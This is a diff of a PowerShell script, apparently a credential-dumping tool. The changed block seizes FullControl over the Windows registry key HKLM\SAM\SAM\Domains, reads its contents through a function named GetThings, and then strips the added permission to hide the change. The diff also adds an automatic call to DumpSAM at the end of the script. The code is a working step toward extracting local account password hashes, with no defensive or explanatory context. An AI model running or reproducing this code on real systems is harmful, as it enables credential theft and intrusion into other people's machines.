@@ -276,26 +276,28 @@ function GetThings {
     } 
     else
     {
-$rule = New-Object System.Security.AccessControl.RegistryAccessRule (
+    $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
     [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
     "FullControl",
     [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
     [System.Security.AccessControl.PropagationFlags]"None",
     [System.Security.AccessControl.AccessControlType]"Allow"
 )
-$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
+    $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
     "SAM\SAM\Domains",
     [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
     [System.Security.AccessControl.RegistryRights]::ChangePermissions
 )
-$acl = $key.GetAccessControl()
-$acl.SetAccessRule($rule)
-$key.SetAccessControl($acl)
-GetThings
-$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-$acl.Access | Where-Object {$_.IdentityReference.Value -eq $user} | ForEach-Object {$acl.RemoveAccessRule($_)} | Out-Null
-Set-Acl HKLM:\SAM\SAM\Domains $acl
+    $acl = $key.GetAccessControl()
+    $acl.SetAccessRule($rule)
+    $key.SetAccessControl($acl)
+    GetThings
+    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $acl.Access | Where-Object {$_.IdentityReference.Value -eq $user} | ForEach-Object {$acl.RemoveAccessRule($_)} | Out-Null
+    Set-Acl HKLM:\SAM\SAM\Domains $acl
 
     }
 }
+
+DumpSAM
 
